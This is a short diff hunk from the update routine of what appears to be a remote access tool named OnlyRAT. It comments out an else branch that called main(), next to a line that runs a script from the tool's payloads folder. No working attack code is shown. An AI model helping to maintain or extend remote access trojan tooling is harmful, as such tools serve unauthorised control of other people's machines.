@@ -249,8 +249,8 @@ def update():
             os.system(f"bash ~/.OnlyRAT/payloads/update.sh")
 
         # exception
-        else:
-            main()
+        # else:
+        #     main()
 
     # otherwise, run main code
     else:
